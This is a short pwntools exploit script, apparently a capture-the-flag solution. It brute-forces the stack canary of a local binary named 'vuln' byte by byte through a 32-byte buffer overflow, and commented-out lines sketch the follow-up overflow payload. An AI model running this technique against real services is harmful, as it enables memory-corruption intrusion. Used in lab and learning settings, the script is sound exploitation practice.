#!/usr/bin/env python

from pwn import *


def canary_brute():
	result = ""
	for i in range(4):
		for k in range(256):
			r = process('./vuln')

			r.sendlineafter('> ', str(33+i))

			test = 'A'*32+result+chr(k)

			r.sendlineafter('> ', test)
			out = r.recvline()
			r.close()
			if 'Now' in out:
				result+=chr(k)
				break
			

	return u32(result)

if __name__ == '__main__':
	canary = canary_brute()
	log.info("Canary Found        " + hex(canary))

# #load
# p = process('./vuln')
# e = ELF('./vuln')

# #send length of entry
# p.sendlineafter('> ', '100')

#AAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
# offset = 32

# #payload
# payload = ''
# payload+= 'A'*offset
# payload+= 'CCCC'
# payload+= 'A'*1000
# p.sendlineafter('Input> ', payload)

# p.interactive()